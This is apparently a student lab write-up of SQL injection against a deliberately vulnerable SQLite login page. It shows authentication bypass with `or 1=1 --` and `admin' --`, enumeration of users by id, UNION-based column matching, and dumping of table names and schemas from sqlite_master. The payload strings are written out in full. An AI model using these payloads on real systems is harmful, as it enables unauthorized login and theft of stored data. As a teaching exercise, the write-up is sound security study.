# SQL Injection

## Basic Exploit
Given no prior information about users, we can try to login by forcing the query to select all rows (ie. `select * from users where 1=1`). We attempted to do this by closing the username and appending an `or 1=1 --` clause to select all rows and ignore the rest of the query (which would ostensibly be the password check).
![alt text](image.png)
The password input does not matter here, as it is commented out via `--`.
This will allow us to login as the first user from the select query.

In a similar manner, we know that `admin` exists in user, so we could also use `admin' --` as our username input, allowing us to select the admin user while bypassing the rest of the query (ie. password) due to the comment operator.
![alt text](image-1.png)

Both of these result in a successful login as the `admin` user, leading to the following page.
![alt text](image-2.png)
As such, this also implies that `admin` is the first user in the user table. 

Our next step was to see the other users. With some prior knowledge of SQL databases, a simple assumption was the existence of some `id` column in the table of users. To verify, we entered `' or id = 0 --` as the user input (with an arbitrary password input that didn't matter). This was done for 2 reasons:
1. To verify the existence of an `id` column for the table containing users (ie. the table this login page was querying). If the `id` column existed, we'd either login as a user or get some feedback like 'invalid login' (`id=0` not in table). If the `id` column did not exist, we would hopefully get feedback through a SQL error that the website would relay.
2. To access the 0th user.

Luckily, `id` was the correct column name containing an integer id for users. This was mostly guesswork based on experience with databases in the past, so we're happy it turned out well. Additionally, we are also lucky that the website does relay information about SQL failures, for example we see the following if we query for `col` via `' or col = 1 --` in the username input.
![alt text](image-3.png)

There was also no `id=0` user, as querying for it resulted in the invalid credentials message (query was probably empty), but we now know that the `id` column exists (as well as that the admin user is the first user in the table from prior steps).
![alt text](image-4.png)

We continued to sequentially inject `' or id = <val> --` into the username input to access users resulting in identifying 12 different users

| id | user | login | dashboard |
| --------------- | --------------- | --------------- | --------------- |
| 1 | admin | ![alt text](image-5.png) | ![alt text](image-6.png) |
| 2 | alice | ![alt text](image-7.png) | ![alt text](image-8.png) |
| 3 | bob | ![alt text](image-9.png) | ![alt text](image-10.png) |
| 4 | charlie | ![alt text](image-11.png) | ![alt text](image-12.png) |
| 5 | david | ![alt text](image-13.png) | ![alt text](image-14.png) |
| 6 | emma | ![alt text](image-15.png) | ![alt text](image-16.png) |
| 7 | frank | ![alt text](image-17.png) | ![alt text](image-18.png) |
| 8 | grace | ![alt text](image-19.png) | ![alt text](image-20.png) |
| 9 | henry | ![alt text](image-21.png) | ![alt text](image-22.png) |
| 10 | isabella | ![alt text](image-23.png) | ![alt text](image-24.png) |
| 11 | jack | ![alt text](image-25.png) | ![alt text](image-26.png) |
| 12 | none -> only 11 users | ![alt text](image-27.png) | ![alt text](image-28.png) |


To verify that jack is truly the last user, we make a selection query that sorts id in descending order and takes the first element -> `' or 1=1 order by id desc --`

![alt text](image-29.png)
![alt text](image-30.png)

Thus, we know that jack is the last user in the user table and the ids range from 1-11. (11 entries in the user table).

But we don't actually know if this table of users is actually named as `user`, nor do we know the details of the schema.

## Advanced Exploit
One thought we had to check the existence of tables is to blindly guess table names with UNION-based querying. If we union select from a table that does not exist, we will likely be relayed that information through a SQL error (similar to when column doesn't exist). If there is no error (ie. we login as some user or we get the invalid credentials message), we know a table with that name exists. 
> Injecting `' UNION select * from <table> --` to accomplish this

(`UNION` allows us to combine the results of multiple queries into one result set given that there are the same number of columns from both queries)

We first checked the existence of a `users` table, via `' UNION select * from users --`
![alt text](image-31.png)
![alt text](image-32.png)

Since there were no errors, we can assume the `users` table exists. 
As an aside, we were also curious about the columns in the `users` table. We assumed the existence of a `username` and `password` column (based on the login page), and the existence of a `role` column since there are admin and user accounts. These names were guessed and blindly checked by injecting `' or <col name> = '' --` in to the username input (and having some arbitrary password input).

But what about other tables? Blindly guessing names and hoping they come up will surely not be very effective unless we're lucky, so what now? That's when we remembered the existence of metadata tables in databases (ie. information_schema in psql, or the more relevant `sqlite_master` in sqlite).

These tables describe the schema of the database, and allow us to find information about other tables (notably table names and the create table statements for them). If we are able to somehow display this information, we could easily determine each table in the database and their columns. Our first thought was to try to use the areas in the dashboard page display the username and role of a user. But first, we have to get a working query.

Initially we simply injected `' UNION select name from sqlite_master --`.
We make sure the initial query ends with an empty username, so that the inital query results in an empty result set. Thus, the result set from the union operation will only contain results from the latter query (ie. `select name from sqlite_master`). However, there is a mismatch in the number of columns, so we added `null`s (empty values) until the error below no longer occured. 
![alt text](image-33.png)
Eventually, we succeeded with `' UNION select name, null, null, null, null from sqlite_master --`, suggesting that there are 5 columns fetched from the initial query. 
![alt text](image-34.png)
![alt text](image-35.png)
Now that we know how many columns to use, we want to know how to display columns in the fields reserved for the username and role (which are currently empty in the above screenshot).
We did this by injecting `' UNION select '1', '2', '3', '4', '5' from sqlite_master where type='table' --` into the username input. This deterministically returns a result set of {1, 2, 3, 4, 5}, which we will use to map each return column to a (hopefully) displayed output on the dashboard. Additionally, we added a `where type='table'` clause just to make sure we only look at tables (and not things like indexes, etc.). 
![alt text](image-36.png)
![alt text](image-37.png)
Now we know that the spots where '2' (username) and '4' (role) are will be displayed on the page. We can use this to display the names of tables, by injecting 
```
' UNION select name, name, null, null, null from sqlite_master where type='table' --
```
into the username. This will display the table name in the name section, however this only works for one table.
![alt text](image-38.png)
![alt text](image-39.png)
(we now know there is a notes table)

We add an offset to the query to figure out the other tables
```
' UNION select name, name, null, tbl_name, null from sqlite_master where type='table' limit 1 offset <n> --
```
`offset` allows us to skip the first `n` columns and `limit 1` just makes it so the query returns one item. This allows us to iterate through the columns by updating `n`. This query also contains `tbl_name` in the 4th column (displayed in role section of dashboard), which is effectively the same as name since we're only looking at tables

| offset | table name | login | dashboard |
| --------------- | --------------- | --------------- | --------------- |
| 0 | notes | ![alt text](image-40.png) | ![alt text](image-41.png) |
| 1 | profiles | ![alt text](image-42.png) | ![alt text](image-43.png) |
| 2 | sqlite_sequence | ![alt text](image-44.png) | ![alt text](image-47.png) |
| 3 | users | ![alt text](image-45.png) | ![alt text](image-48.png) |
| 4 | N/A (invalid credentials, no more tables) | ![alt text](image-46.png) | ![alt text](image-49.png) |

Now we know there are 4 tables in the schema
1. notes
2. profiles
3. sqlite_sequence
4. users

But what about the columns? If we select `sql` from the `sqlite_master` table for a table, we can get the create table statement. Thus we will do the same strategy as we previously did (for getting the names) but this time we'll include the `sql` create table statements
```
' UNION select name, tbl_name, null, sql, null from sqlite_master where type='table' limit 1 offset <n> --
```
(`tbl_name` where username is displayed, `sql` where role is displayed)

| offset | table name | login | dashboard |
| --------------- | --------------- | --------------- | --------------- |
| 0 | notes | ![alt text](image-50.png) | ![alt text](image-51.png) |
| 1 | profiles | ![alt text](image-52.png) | ![alt text](image-53.png) |
| 2 | sqlite_sequence | ![alt text](image-54.png) | ![alt text](image-55.png) |
| 3 | users | ![alt text](image-56.png) | ![alt text](image-57.png) |

Thus, we have the following tables in the schema

**notes**
```sql
CREATE TABLE notes (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    title TEXT,
    content TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    is_public INTEGER DEFAULT 0,
    FOREIGN KEY(user_id) REFERENCES users(id)
)
```

**profiles**
```sql
CREATE TABLE profiles (
    user_id INTEGER PRIMARY KEY,
    full_name TEXT,
    email TEXT,
    bio TEXT,
    avatar_url TEXT,
    FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE
)
```

**sqlite_sequence**
```sql
CREATE TABLE sqlite_sequence(name,seq)

```

**users**
```sql
CREATE TABLE users ( 
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    -- in reality these should be hashed, but kept plain for lab 
    role TEXT DEFAULT 'user',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)
```


